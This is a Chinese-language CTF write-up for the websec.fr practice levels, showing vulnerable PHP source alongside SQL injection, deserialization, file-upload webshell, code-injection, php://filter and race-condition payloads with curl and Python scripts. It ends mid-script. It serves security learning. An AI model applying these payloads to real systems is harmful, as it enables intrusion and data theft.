---
title: websec.fr-writeup
abbrlink: 7418
date: 2018-09-04 11:47:34
tags: ctf
keywords: websec.fr-writeup
description: websec.fr-writeup
---

# level1

获取数据表的结构:

须知:

```
sqlite> pragma table_info(users);
+-----+----------+---------+---------+------------+----+
| cid | name     | type    | notnull | dflt_value | pk |
+-----+----------+---------+---------+------------+----+
| 0   | id       | integer | 1       | NULL       | 1  |
| 1   | login    | text    | 0       | NULL       | 0  |
| 2   | password | TEXT    | 0       | NULL       | 0  |
+-----+----------+---------+---------+------------+----+
3 rows in set (0.04 sec)
sqlite> select sql from sqlite_master;
+-------------------------------------------------------------------------------------------------+
| sql                                                                                             |
+-------------------------------------------------------------------------------------------------+
| CREATE TABLE "users" (
  "id" integer NOT NULL,
  "login" text,
  "password" TEXT,
  PRIMARY KEY ("id")
) |
+-------------------------------------------------------------------------------------------------+
1 row in set (0.04 sec)
sqlite> select * from users where id=1 union select 1, 2, sql from sqlite_master;
+----+----------+------------------------------------ --------------------------------------------+
| id | login    | password                                                                        |
+----+----------+---------------------------------------------------------------------------------+
| 1  | 2        | CREATE TABLE "users" (
  "id" integer NOT NULL,
  "login" text,
  "password" TEXT,
  PRIMARY KEY ("id")
) |
| 1  | user_two | admino1                                                                                              |
+----+----------+---------------------------------------------------------------------------------+
2 rows in set (0.04 sec)
```

payload:

```
5 union select 1, sql from sqlite_master 
```

结果:

>  CREATE TABLE users(id int(7), username varchar(255), password varchar(255))

获取flag。

```
5 union select 1,password from users where id=1 
```

# level2

payload:

```
ht@TIANJI:/mnt/d/ht-blog$ curl -d "user_id=5 uniounionn seselectlect 1,password frfromom users where id=1&submit=1" https://websec.fr/level02/index.php | grep -Eo "WEBSEC{.*}"
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1962    0  1883  100    79   1211     50  0:00:01  0:00:01 --:--:--  1211
WEBSEC{BecauseBlacklistsAreOftenAgoodIdea}
```



# level3

参考链接:

* http://www.vuln.cn/6880
* https://stackoverflow.com/questions/49245637/sanitizing-passwords-for-password-hash

第二个测试如下(7.0.30):

```shell
php > $hash = password_hash("\x00 abc", PASSWORD_DEFAULT);
php > var_dump(password_verify("\x00 foo", $hash)); // true ???
bool(true)
php > $hash = password_hash("\x00 abc", PASSWORD_DEFAULT); 
php > var_dump(password_verify('\x00 foo', $hash)); // true ???
bool(false)
```

我们来看一下sha1函数:

![](/assets/websec/TIM截图20180920220958.png)

sha1($_POST['c'], false)将返回一个40位字符长度的16进制数字，而不是一个20位的字符串。

```php
<?php
if(isset($_POST['c'])) {
    /*  Get rid of clever people that put `c[]=bla`
     *  in the request to confuse `password_hash`
     */
    $h2 = password_hash (sha1($_POST['c'], fa1se), PASSWORD_BCRYPT);

    echo "<div class='row'>";
    if (password_verify (sha1($flag, fa1se), $h2) === true) {
       echo "<p>Here is your flag: <mark>$flag</mark></p>"; 
    } else {
        echo "<p>Here is the <em>hash</em> of your flag: <mark>" . sha1($flag, false) . "</mark></p>";
    }
    echo "</div>";
}
?>
```

随机输入一个值，我们发现`sha1($flag, false)`的值为`7c00249d409a91ab84e3f421c193520d9fb3674b`。

第三位和第四位都是`0`，所以参考上边的文章，我们只需要找到一个sha1之后的值以`7c00`开头的值即可。

```php
<?php                                               
    for($i = 0; $i < 100000000; $i++) {             
        if(substr(sha1($i, false), 0, 4) == "7c00") {
            echo substr(sha1($i, false), 0, 4);     
            echo "\n";                              
            echo $i;                                
            break;                                  
        }                                           
}
```

得到`104610`。

getflag:

```
ht@TIANJI:/mnt/d/wamp64/www/backdoor$ curl -d "c=104610" https://websec.fr/level03/index.php | grep -Eo "WEBSEC{.*}"
WEBSEC{Please_Do_not_combine_rAw_hash_functions_mi}
```

# level4

```php
<?php

class SQL {
    public $query = '';
    public $conn;
    public function __construct() {
    }
    
    public function connect() {
        $this->conn = new SQLite3 ("database.db", SQLITE3_OPEN_READONLY);
    }

    public function SQL_query($query) {
        $this->query = $query;
    }

    public function execute() {
        return $this->conn->query ($this->query);
    }

    public function __destruct() {
        if (!isset ($this->conn)) {
            $this->connect ();
        }
        
        $ret = $this->execute ();
        if (false !== $ret) {    
            while (false !== ($row = $ret->fetchArray (SQLITE3_ASSOC))) {
                echo '<p class="well"><strong>Username:<strong> ' . $row['username'] . '</p>';
            }
        }
    }
}
?>
```

```php
<?php
include 'connect.php';

$sql = new SQL();
$sql->connect();
$sql->query = 'SELECT username FROM users WHERE id=';


if (isset ($_COOKIE['leet_hax0r'])) {
    $sess_data = unserialize (base64_decode ($_COOKIE['leet_hax0r']));
    try {
        if (is_array($sess_data) && $sess_data['ip'] != $_SERVER['REMOTE_ADDR']) {
            die('CANT HACK US!!!');
        }
    } catch(Exception $e) {
        echo $e;
    }
} else {
    $cookie = base64_encode (serialize (array ( 'ip' => $_SERVER['REMOTE_ADDR']))) ;
    setcookie ('leet_hax0r', $cookie, time () + (86400 * 30));
}

if (isset ($_REQUEST['id']) && is_numeric ($_REQUEST['id'])) {
    try {
        $sql->query .= $_REQUEST['id'];
    } catch(Exception $e) {
        echo ' Invalid query';
    }
}
?>
```

获取数据库创建信息:

```shell
ht@TIANJI:/mnt/d/ht-blog$ curl -b "leet_hax0r=TzozOiJTUUwiOjI6e3M6NToicXVlcnkiO3M6NDE6InNlbGVjdCBzcWwgYXMgdXNlcm5hbWUgZnJvbSBzcWxpdGVfbWFzdGVyIjtzOjQ6ImNvbm4iO047fQ==" https://websec.fr/level04/index.php

<!DOCTYPE html>
<html>
<head>
        <title>#WebSec Level Four</title>
        <link rel="stylesheet" href="../static/bootstrap.min.css" />
</head>
        <body>
                <div id="main">
                        <div class="container">
                                <div class="row">
                                        <h1>LevelFour <small> - Cereal is nation</small></h1>
                                </div>
                                <div class="row">
                                        <p class="lead">
                                                Since we're lazy, we take advantage of php's garbage collector to properly display query results.<br>
                                                 We also do like to write neat OOP.
                                                You can get the sources <a href="source1.php">here</a> and <a href="source2.php">here</a>.
                                        </p>
                                </div>
                        </div>
                        <div class="container">
                                <div class="row">
                                        <form class="form-inline" method='post'>
                                                <input name='id' class='form-control' type='text' placeholder='User id'>
                                                <input class="form-control btn btn-default" name="submit" value='Go' type='submit'>
                                        </form>
                                </div>
                        </div>
                </div>
        </body>
</html>
<p class="well"><strong>Username:<strong> CREATE TABLE users(id int, username varchar, password varchar)</p>
```

> CREATE TABLE users(id int, username varchar, password varchar)

获取flag:

```SHELL
ht@TIANJI:/mnt/d/ht-blog$ curl -b "leet_hax0r=TzozOiJTUUwiOjI6e3M6NToicXVlcnkiO3M6NTE6InNlbGVjdCBwYXNzd29yZCBhcyB1c2VybmFtZSBmcm9tIHVzZXJzIHdoZXJlIGlkID0gMSI7czo0OiJjb25uIjtOO30=" https://websec.fr/level04/index.php | grep -Eo "WEBSEC{.*}"
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1441    0  1441    0     0    862      0 --:--:--  0:00:01 --:--:--   861
WEBSEC{9abd8e8247cbe62641ff662e8fbb662769c08500}
```

# level7

```php
<?php
ini_set('display_errors', 'on');
ini_set('error_reporting', E_ALL);

function sanitize($str) {
    /* Rock-solid ! */
    $special1 = ["!", "\"", "#", "$", "%", "&", "'", "+", "-"];
    $special2 = [".", "/",  ":", ";", "<", "=", ">", "?", "@"];
    $special3 = ["[", "]", "^", "_", "`", "\\", "|", "{", "}"];

    $sql = ["or", "is", "like", "glob", "join", "0", "limit", "char"];

    $blacklist = array_merge($special1, $special2, $special3, $sql);

    foreach ($blacklist as $value) {
        if (stripos ($str, $value) !== false)
            die ("Presence of '" . $value . "' detected: abort, abort, abort!\n");
    }
}

if (isset ($_POST['submit']) && isset ($_POST['user_id'])) {
    $injection = $_POST['user_id'];
    $pdo = new SQLite3 ('database.db', SQLITE3_OPEN_READONLY);

    sanitize ($injection);

    //$query = 'SELECT id,login,password FROM users WHERE id=' . $injection;
    $query = 'SELECT id,login FROM users WHERE id=' . $injection;
    $getUsers = $pdo->query ($query);
    $users = $getUsers->fetchArray (SQLITE3_ASSOC);

    $userDetails = false;
    if ($users) {
        $userDetails = $users;
    }
}
?>
```

trick:

过滤了`<`, `=`, `>` 可以使用`in` 或者 `between ... and...`替代。

过滤了`'`， `"`,可以使用一些方法替代单引号，比如

* `hex` 

该方法在mysql下表现如下:

```
mysql> select hex(119);
+----------+
| hex(119) |
+----------+
| 77       |
+----------+
```

在sqllite中表现如下:

```
sqlite> select hex(119);
+----------+
| hex(119) |
+----------+
| 313139   |
+----------+
```

所以本题中不适合使用该方法。

* substr，截取字符串

测试:

查询所有数据。

```
sqlite> select * from (select 1)a,(select 2)b, (select 3)c union select * from users;
+---+-----------+---------+
| 1 | 2         | 3       |
+---+-----------+---------+
| 0 | user_one  | flag    |
| 1 | 2         | 3       |
| 1 | user_two  | admino1 |
| 2 | user_tree | admine1 |
+---+-----------+---------+
```

查询`password`字段。

```shell
mysql> select j.3 from (select * from (select 1)a,(select 2)b, (select 3)c union select * from users)j;             // 虽然 mysql 支持".3"的语法，最好还是去别名比较好，下文会提到。
+---------+
| 3       |
+---------+
| 3       |
| admino2 |
| admine  |
+---------+
3 rows in set (0.00 sec)
-------------------------------------------------------------------------------------------------
sqlite> select j.3 from (select * from (select 1)a,(select 2)b, (select 3)c union select * from users)j;                    // 可以看到 sqlite 不支持 ".3",但是可以取别名的方式
near ".3": syntax error
sqlite> select j.x3 from (select * from (select 1 x1)a,(select 2 x2)b, (select 3 x3)c union select * from users)j; //给1,2,3分别取别名`x1`,`x2`,`x3`,这里`j.x3`可以替换为`x3`没有问题,因为仅有一列列名为`x3`
+---------+
| x3      |
+---------+
| flag    |
| 3       |
| admino1 |
| admine1 |
+---------+
4 rows in set (0.04 sec)
```

提取`id`为1的一行数据。

mysql下:

```
mysql> select x3 from (select * from (select 4 x1)a,(select 2 x2)b, (select 3 x3)c union select * from users)j where x1 in (1);
+---------+
| x3      |
+---------+
| admino2 |
+---------+
1 row in set (0.00 sec)
```

sqlite下, 由于sqlite不支持`right()`，`hex()`函数有所区别，需要另辟蹊径:

```
sqlite> select x3 from (select * from (select 4 x1)a,(select 2 x2)b, (select 3 x3)c union select * from users)d where x1 between 1 and 1;
+---------+
| x3      |
+---------+
| admino1 |
+---------+
1 row in set (0.04 sec)
```

最终payload:

mysql有效,最开始的payload有些复杂:

```
select id, login from users where id = 5 union select (select 5)g,(select x2 from (select * from (select 1)a,(select 2 x1)b, (select 3 x2)c union select * from users)j where hex(right(x1, 1)) in (hex(111)))f;
```

改进版:

```
select id, login from users where id = 5 union select (select 5)g,(select x3 from (select * from (select 4 x1)a,(select 2 x2)b, (select 3 x3)c union select * from users)j where x1 in (1))f
```

sqlite有效,一开始，有点复杂，记录一下:

```
select id, login from users where id = 5 union select (select 2)g, (select x2 from (select * from (select 1 as x3)a,(select 2 x1)b, (select 3 x2)c union select * from users)h where x3 between 1 and 1 and length(x1) between 8 and 8)f;
```

改进版:

```
select id, login from users where id = 5 union select (select 2)g, (select x3 from (select * from (select 4 x1)a,(select 2 x2)b, (select 3 x3)c union select * from users)d where x1 between 1 and 1)f;
```

`WEBSEC{Because_blacklist_based_filter_are_always_great}`

# level8

```php
 <?php
 $uploadedFile = sprintf('%1$s/%2$s', '/uploads', sha1($_FILES['fileToUpload']['name']) . '.gif');

if (file_exists ($uploadedFile)) { unlink ($uploadedFile); }

if ($_FILES['fileToUpload']['size'] <= 50000) {
if (getimagesize ($_FILES['fileToUpload']['tmp_name']) !== false) {
if (exif_imagetype($_FILES['fileToUpload']['tmp_name']) === IMAGETYPE_GIF) {
move_uploaded_file ($_FILES['fileToUpload']['tmp_name'], $uploadedFile);
echo '<p class="lead">Dump of <a href="/level08' . $uploadedFile . '">'. htmlentities($_FILES['fileToUpload']['name']) . '</a>:</p>';
echo '<pre>';
include_once($uploadedFile);
echo '</pre>';
unlink($uploadedFile);
} else { echo '<p class="text-danger">The file is not a GIF</p>'; }
} else { echo '<p class="text-danger">The file is not an image</p>'; }
} else { echo '<p class="text-danger">The file is too big</p>'; }
?>
</div>
<?php endif ?>
```

这里使用`exif_imagetype`函数检测图片是否是GIF，该函数仅检查开头几个字节。

payload, 列目录:

```
GIF89
<?php 
	echo "shell"; $dr = @opendir('./');   
	while(($files[] = readdir($dr)) !== false);
   	print_r($files);?>
```

结果：

```
Array
(
    [0] => .
    [1] => uploads
    [2] => ..
    [3] => flag.txt
    [4] => source.php
    [5] => index.php
    [6] => php-fpm.sock
    [7] => 
)
```

查看flag.txt:

```
GIF89
<?php 
	var_dump(file_get_contents("flag.txt"));	
?>
```

# level10

```php
<?php
if (isset ($_REQUEST['f']) && isset ($_REQUEST['hash'])) {
$file = $_REQUEST['f'];
$request = $_REQUEST['hash'];

$hash = substr (md5 ($flag . $file . $flag), 0, 8);

echo '<div class="row"><br><pre>';
if ($request == $hash) {
show_source ($file);
} else {
echo 'Permission denied!';
}
echo '</pre></div>';
}
?>
```

知识点:

```shell
php > var_dump("0" == "0e251234");
bool(true)
php > var_dump("0" == "0e2abcde");
bool(false)
```

令`hash`为`0`。

通过构造 `f = '.' + '/' * i + 'flag.php'`,让后爆破即可。

```python
#!/usr/bin/python
# coding: utf-8
from requests import *
import sys
url = 'http://websec.fr/level10/index.php'
f = './flag.php'
i = 880
data = {
    'f': f,
    'hash': 0,
}
while True:
    i += 1
    r = post(url, data=data)
    if 'Permission denied!' in r.content:
        f = '.' + '/' * i + 'flag.php'
    else:
        print('[*] successful payload : {0}'.format(f))
        print(r.content)
        sys.exit(0)
```

# level11

```php
<?php
ini_set('display_errors', 'on');
ini_set('error_reporting', E_ALL);

function sanitize($id, $table) {
    /* Rock-solid: https://secure.php.net/manual/en/function.is-numeric.php */
    if (! is_numeric ($id) or $id < 2) {
        exit("The id must be numeric, and superior to one.");
    }

    /* Rock-solid too! */
    $special1 = ["!", "\"", "#", "$", "%", "&", "'", "*", "+", "-"];
    $special2 = [".", "/", ":", ";", "<", "=", ">", "?", "@", "[", "\\", "]"];
    $special3 = ["^", "_", "`", "{", "|", "}"];
    $sql = ["union", "0", "join", "as"];
    $blacklist = array_merge ($special1, $special2, $special3, $sql);
    foreach ($blacklist as $value) {
        if (stripos($table, $value) !== false)
            exit("Presence of '" . $value . "' detected: abort, abort, abort!\n");
    }
}

if (isset ($_POST['submit']) && isset ($_POST['user_id']) && isset ($_POST['table'])) {
    $id = $_POST['user_id'];
    $table = $_POST['table'];

    sanitize($id, $table);

    $pdo = new SQLite3('database.db', SQLITE3_OPEN_READONLY);
    $query = 'SELECT id,username FROM ' . $table . ' WHERE id = ' . $id;
    //$query = 'SELECT id,username,enemy FROM ' . $table . ' WHERE id = ' . $id;

    $getUsers = $pdo->query($query);
    $users = $getUsers->fetchArray(SQLITE3_ASSOC);

    $userDetails = false;
    if ($users) {
        $userDetails = $users;
    $userDetails['table'] = htmlentities($table);
    }
}
?>
```

由于`$table`可控，所以，可以通过子查询绕过。

```
user_id=4&table=(select 4 id, enemy username from costume)&submit=%E6%8F%90%E4%BA%A4
结果：
WEBSEC{Who_needs_AS_anyway_when_you_have_sqlite}
```

# level14未解决

```php
<?php

$funcs_internal = get_defined_functions()['internal'];

/* lets allow some secure funcs here */
unset ($funcs_internal[array_search('strlen', $funcs_internal)]);
unset ($funcs_internal[array_search('print', $funcs_internal)]);
unset ($funcs_internal[array_search('strcmp', $funcs_internal)]);
unset ($funcs_internal[array_search('strncmp', $funcs_internal)]);

$funcs_extra = array ('eval', 'include', 'require', 'function');
$funny_chars = array ('\.', '\+', '-', '\*', '"', '`', '\[', '\]');
$variables = array ('_GET', '_POST', '_COOKIE', '_REQUEST', '_SERVER', '_FILES', '_ENV', 'HTTP_ENV_VARS', '_SESSION', 'GLOBALS');

$blacklist = array_merge($funcs_internal, $funcs_extra, $funny_chars, $variables);

$insecure = false;
foreach ($blacklist as $blacklisted) {
    if (preg_match ('/' . $blacklisted . '/im', $code)) {
        $insecure = true;
        break;
    }
}

if ($insecure) {
    echo 'Insecure code detected!';
} else {
    eval ($code);
}

?>
```

php的tricks:

```shell
ht@TIANJI:~/temp$ php -a
Interactive mode enabled

php > 'system'('ls');
1.php
php > $a = ['1','system'];
php > echo $a{1};
system
php > $a{1}('ls');
1.php
```

执行`phpinfo()`

```
$blacklist{562}();
```

# level15

```php
<?php
ini_set('display_errors', 'on');
ini_set('error_reporting', E_ALL);

$success = '
<div class="alert alert-success alert-dismissible" role="alert">
    <button type="button" class="close" data-dismiss="alert" aria-label="Close"><span aria-hidden="true">&times;</span></button>
    Function declared.
</div>
';

include "flag.php";

if (isset ($_POST['c']) && !empty ($_POST['c'])) {
    $fun = create_function('$flag', $_POST['c']);
    print($success);
    //fun($flag);
    if (isset($_POST['q']) && $_POST['q'] == 'checked') {
        die();
    }
}
?>
```

`create_function`参数可控，可以代码执行。

payload: `echo 2;}echo $flag;/*`

> curl -v -d "c=%65%63%68%6f%20%32%3b%7d%65%63%68%6f%20%24%66%6c%61%67%3b%2f%2a" https://websec.fr/level15/index.php | grep -Eo "WEBSEC{.*?}"
>
> curl -v -d "c=echo 2;}echo \\$flag;/*&q=0" https://websec.fr/level15/index.php

# level17

```php
<?php
if (! strcasecmp ($_POST['flag'], $flag))
echo '<div class="alert alert-success">Here is your flag: <mark>' . $flag . '</mark>.</div>';   
else
echo '<div class="alert alert-danger">Invalid flag, sorry.</div>';
?>
```

传递数组即可绕过`strcasecmp`检测。

> curl http://websec.fr/level17/index.php -d "flag[]=" | grep -Eo "WEBSEC{.*}"

# level18

```php
<?php
include "flag.php";

if (isset ($POST['obj'])) {
    setcookie ('obj', $_POST['obj']);
} elseif (!isset ($_COOKIE['obj'])) {
    $obj = new stdClass;
    $obj->input = 1234;
    setcookie ('obj', serialize ($obj));
}
?>
<?php if (isset ($_COOKIE['obj'])): ?>
                        <br>
                        <div class="container">
                            <div class="row">
                                <?php
                                    $obj = $_COOKIE['obj'];
                                    $unserialized_obj = unserialize ($obj);
                                    $unserialized_obj->flag = $flag;  
                                    if (hash_equals ($unserialized_obj->input, $unserialized_obj->flag))
                                        echo '<div class="alert alert-success">Here is your flag: <mark>' . $flag . '</mark>.</div>';   
                                    else 
                                        echo '<div class="alert alert-danger"><code>' . htmlentities($obj) . '</code> is an invalid object, sorry.</div>';
                                ?>
                            </div>
                        </div>
                        <?php endif ?>
```

payload:

```
data = new stdClass;
$data->flag = 1234;
$data->input = &$data->flag;

$data1 =  serialize($data);

=> 

O:8:"stdClass":2:{s:4:"flag";i:1234;s:5:"input";R:2;}

url编码 =>
O%3A8%3A%22stdClass%22%3A2%3A%7Bs%3A4%3A%22flag%22%3Bi%3A1234%3Bs%3A5%3A%22input%22%3BR%3A2%3B%7D
```

```
ht@TIANJI:/mnt/d/ht-blog$ curl -b 'obj=O%3A8%3A%22stdClass%22%3A2%3A%7Bs%3A4%3A%22flag%22%3Bi%3A1234%3Bs%3A5%3A%22input%22%3BR%3A2%3B%7D' https://websec.fr/level18/index.php | grep -Eo "WEBSEC{.*}"
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1879    0  1879    0     0    423      0 --:--:--  0:00:04 --:--:--   584
WEBSEC{You_have_impressive_refrences._We'll_call_you_back.}
```

WEBSEC{You_have_impressive_refrences._We'll_call_you_back.}`

# level20

```php
<?php

include "flag.php";

class Flag {
    public function __destruct() {
       global $flag;
       echo $flag; 
    }
}

function sanitize($data) {
    /* i0n1c's bypass won't save you this time! (https://www.exploit-db.com/exploits/22547/) */
    if ( ! preg_match ('/[A-Z]:/', $data)) {
        return unserialize ($data);
    }

    if ( ! preg_match ('/(^|;|{|})O:[0-9+]+:"/', $data )) {
        return unserialize ($data);
    }

    return false;
}

$data = Array();
if (isset ($_COOKIE['data'])) {
    $data = sanitize (base64_decode ($_COOKIE['data']));
}

if (isset ($_POST['value']) and ! empty ($_POST['value'])) {
    /* Add a value twice to remove it from the list. */
    if (($key = array_search ($_POST['value'], $data)) !== false) {
        unset ($data[$key]);
    } else { /* Else, simply add it. */
        array_push ($data, $_POST['value']);
    }
    setcookie ('data', base64_encode (serialize ($data)));
}

?>
```

i0n1c's bypass:

```
a:1:{i:0;O:+15:"db_driver_mysql":1:{s:3:"obj";a:2:{s:13:"use_debug_log";i:1;s:9:"debug_log";s:12:"cache/sh.php";}}}
```

我们可以看到正则表达式过滤了`+`,使用`/[A-Z]:` 替换了`if ( strpos( $serialized, 'O:' ) === false )`。

通过阅读文档，我们发现如下记录:

Changelog:

| Version | Description                                                  |
| ------- | ------------------------------------------------------------ |
| 7.1.0   | The allowed_classes element of options) is now strictly typed, i.e. if anything other than an array or a boolean is given, unserialize() returns FALSE and issues an E_WARNING. |
| 7.0.0   | The options parameter has been added.                        |
| 5.6.0   | Manipulating the serialised data by replacing C: with O: to force object instantiation without calling the constructor will now fail. |

大意就是:5.6不允许将修改已经序列化数据中的C:改为O:来避免调用类中生成器。

可参考改文章: https://segmentfault.com/q/1010000010242774。

`C:`表示类里边有`unserialize`方法。

`O:`表示类里边没有`unserialize`方法。

php5.3:

```php
class obj implements Serializable {
    public $data;
    public function __construct() {
        $this->data = "My private data";
    }
    public function serialize() {
        return serialize($this->data);
    }
    public function unserialize($data) {
        echo 'test';
    }
}
  
$test = new obj();
echo serialize($test);//输出C:3:"obj":23:{s:15:"My private data";}

var_dump(unserialize('C:3:"obj":23:{s:15:"My private data";}'));//调用unserialize方法，输出test
var_dump(unserialize('O:3:"obj":1:{s:4:"data";s:15:"My private data";}'));//没有调用unserialize方法，没有输出
```

php5.6:

```php
class obj implements Serializable {
    public $data;
    public function __construct() {
        $this->data = "My private data";
    }
    public function serialize() {
        return serialize($this->data);
    }
    public function unserialize($data) {
        echo 'test';
    }
}

$test = new obj();
echo serialize($test);//输出C:3:"obj":23:{s:15:"My private data";}

var_dump(unserialize('C:3:"obj":23:{s:15:"My private data";}'));//调用unserialize方法，输出test
var_dump(unserialize('O:3:"obj":1:{s:4:"data";s:15:"My private data";}'));//抛出了一个Warning,PHP Warning:  Erroneous data format for unserializing 'obj' 
```

所以其实这个更新的意思就是说，不能靠修改序列化的数据，在不调用对象构造器的情况下实例化对象。

`C:`不能改为`O:`, 但是我们可以尝试将`O:`改为`C:`。

测试如下payload:

```
C:4:"Flag":23:{s:15:"My private data";}
```

可以看到成功反序列化了，仅仅给出了一个`Warning`。

```shell
ht@TIANJI:/mnt/c/Users/HT/Desktop$ php -a                                                   
Interactive mode enabled                                                                    
                                                                                            
php > var_dump(unserialize('C:4:"Flag":23:{s:15:"My private data";}'));                     
PHP Warning:  Class __PHP_Incomplete_Class has no unserializer in php shell code on line 1  
object(__PHP_Incomplete_Class)#1 (1) {                                                      
  ["__PHP_Incomplete_Class_Name"]=>                                                         
  string(4) "Flag"                                                                          
}
php > exit
ht@TIANJI:/mnt/c/Users/HT/Desktop$ echo -n 'C:4:"Flag":23:{s:15:"My private data";}' | base64
Qzo0OiJGbGFnIjoyMzp7czoxNToiTXkgcHJpdmF0ZSBkYXRhIjt9
```

获取flag:

```
ht@TIANJI:/mnt/c/Users/HT/Desktop$ curl -b "data=Qzo0OiJGbGFnIjoyMzp7czoxNToiTXkgcHJpdmF0ZSBkYXRhIjt9" https://websec.fr/level20/index.php | grep -Eo "WEBSEC{.*}"
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  2160    0  2160    0     0   1177      0 --:--:--  0:00:01 --:--:--  1177
WEBSEC{CVE-2012-5692_was_a_lof_of_phun_thanks_to_i0n1c_but_this_was_not_the_only_bypass}
```

# level22

```php
<?php 
ini_set('display_errors', 'on');
ini_set('error_reporting', E_ALL ^ E_DEPRECATED);

if (isset ($_GET['code']) && is_string ($_GET['code'])) {
            $code = substr ($_GET['code'], 0, 21);
} else {
            $code = "'I hate PHP'";
}

class A {
    public $pub;
    protected $pro ;
    private $pri;

    function __construct($pub, $pro, $pri) {
        $this->pub = $pub;
        $this->pro = $pro;
        $this->pri = $pri;
    }
}

include 'file_containing_the_flag_parts.php';
$a = new A($f1, $f2, $f3);

unset($f1);
unset($f2);
unset($f3);

$funcs_internal = get_defined_functions()['internal'];

/* lets allow some secure funcs here */
unset ($funcs_internal[array_search('strlen', $funcs_internal)]);
unset ($funcs_internal[array_search('print', $funcs_internal)]);
unset ($funcs_internal[array_search('strcmp', $funcs_internal)]);
unset ($funcs_internal[array_search('strncmp', $funcs_internal)]);

$funcs_extra = array ('eval', 'include', 'require', 'function');
$funny_chars = array ('\.', '\+', '-', '"', ';', '`', '\[', '\]');
$variables = array ('_GET', '_POST', '_COOKIE', '_REQUEST', '_SERVER', '_FILES', '_ENV', 'HTTP_ENV_VARS', '_SESSION', 'GLOBALS');

$blacklist = array_merge($funcs_internal, $funcs_extra, $funny_chars, $variables);

$insecure = false;
foreach ($blacklist as $blacklisted) {
    if (preg_match ('/' . $blacklisted . '/im', $code)) {
        $insecure = true;
        break;
    }
}

if ($insecure) {
    echo 'Insecure code detected!';
} else {
    eval ("echo $code;");
}
?>
```

这里我们可以看到虽然过滤了很多函数，但是`$blacklist`变量并没有过滤。通过`level14`中php的`trick`即可执行任意函数。通过代码可知，flag应该是在`$a` 变量里边，所以可以通过`var_dump($a)`获取flag。

首先获取`var_dump`函数的位置。

```shell
for i in {1..1365}; do  
    echo -e "$i: " && \
    curl --silent  http://websec.fr/level22/index.php?code=%24blacklist%7B$i%7D | \
    grep -oP "([\s\S]+)(?:<\/pre>)"
done
```

最终发现`var_dump`在`$blacklist{579}`。

payload:

> \$blacklist{579}($a)

结果：

```html
object(A)#1 (3) {
  ["pub"]=>
  string(17) "WEBSEC{But_I_was_"
  ["pro":protected]=>
  string(18) "told_that_OOP_was_"
  ["pri":"A":private]=>
  string(22) "flawless_and_stuff_:<}"
}
```



# level24

```php
<?php
ini_set('display_errors', 'on');
ini_set('error_reporting', E_ALL);

session_start();

include 'clean_up.php';

/* periodic cleanup */
foreach (glob("./uploads/*") as $file) {
    if (is_file($file)) {
        unlink($file);
    } else {
        if (time() - filemtime($file) >= 60 * 60 * 24 * 7) {
            Delete($file);
        }
    }
}

$upload_dir = sprintf("./uploads/%s/", session_id());
@mkdir($upload_dir, 0755, true);

/* sandboxing ! */
chdir($upload_dir);
ini_set('open_basedir', '.');

$p = "list";
$data = "";
$filename = "";

if (isset($_GET['p']) && isset($_GET['filename']) ) {
    $filename = $_GET['filename'];
    if ($_GET['p'] === "edit") {
        $p = "edit";
        if (isset($_POST['data'])) {
            $data = $_POST['data'];
            if (strpos($data, '<?')  === false && stripos($data, 'script')  === false) {  # no interpretable code please.
                file_put_contents($_GET['filename'], $data);
                die ('<meta http-equiv="refresh" content="0; url=.">');
            }
        } elseif (file_exists($_GET['filename'])){
            $data = file_get_contents($_GET['filename']);
        }
    }
}
?>
```

这里由于`filename`可控，可以令`filename`格式为:`php://filter/convert.base64-decode/resource=shell.php`,再将`base64_encode(payload)`写入shell.php中，即可在执行`$data = file_get_contents($_GET['filename']);`执行。

payload:

```shell
php > echo base64_encode("<?php echo file_get_contents('../../flag.php'); ?>");
PD9waHAgZWNobyBmaWxlX2dldF9jb250ZW50cygnLi4vLi4vZmxhZy5waHAnKTsgPz4=
```

filename:

```
php://filter/convert.base64-decode/resource=shell.php
```

测试如下:

```shell
ht@TIANJI:~/temp$ php -a                                                           
Interactive mode enabled                                             
php > $data = base64_encode("<?php echo 1; ?>"); file_put_contents("php://filter/convert.base64-decode/resource=test1.php", $data);                                                   
php > exit                                                                          
ht@TIANJI:~/temp$ ls       
test1.php
ht@TIANJI:~/temp$ cat test1.php  
<?php echo 1; ?>
ht@TIANJI:~/temp$                                                                              
```



# level25

```php
<?php
    parse_str(parse_url($_SERVER['REQUEST_URI'])['query'], $query);
    foreach ($query as $k => $v) {
    if (stripos($v, 'flag') !== false)
    die('You are not allowed to get the flag, sorry :/');
    }

    include $_GET['page'] . '.txt';
    ?>
```

`parse_url`绕过:

payload:

> curl http://websec.fr///level25/index.php?page=flag | grep -Eo "WEBSEC{.*}"

# level28

```php
<?php
if(isset($_POST['submit'])) {
  if ($_FILES['flag_file']['size'] > 4096) {
    die('Your file is too heavy.');
  }
  $filename = md5($_SERVER['REMOTE_ADDR']) . '.php';

  $fp = fopen($_FILES['flag_file']['tmp_name'], 'r');
  $flagfilecontent = fread($fp, filesize($_FILES['flag_file']['tmp_name']));
  @fclose($fp);

    file_put_contents($filename, $flagfilecontent);
  if (md5_file($filename) === md5_file('flag.php') && $_POST['checksum'] == crc32($_POST['checksum'])) {
    include($filename);  // it contains the `$flag` variable
    } else {
        $flag = "Nope, $filename is not the right file, sorry.";
        sleep(1);  // Deter bruteforce
    }

  unlink($filename);
}
?>
```

条件竞争:

1.php:

```php
<?php
        var_dump(file_get_contents("flag.php"));
```

上传文件:

>  curl https://websec.fr/level28/index.php -F "flag_file=@1.php" -F "submit=1"

然后不断访问: https://websec.fr/level28/53fdb7c766848a88eabc80476d3e42c6.php 即可。

```python
#!/usr/bin/python
# coding: utf-8

from requests import *
from multiprocessing import Process
import time

md5ip = '70d75feefefdefaa925f4dac3179fec3'
webshell = 'payload.php'

def uploadWebshell():
    url = 'https://websec.fr/level28/index.php'
    # url = 'http://3dc.oa.to:4000/15no47m1'

    files = {'flag_file': (webshell, open(webshell, 'rb'), 'application/octet-stream')}
    data = {'checksum[]': '123', 'submit': 'Upload and check'}

    r = post(url, files = files, data = data)
    print '[*] your webshell successfully uploaded!'
    # print r.text


def executeWebshell():
    for _ in range(1):
        time.sleep(0.1)
        url = 'https://websec.fr/level28/{0}.php'.format(md5ip)
        r = get(url)
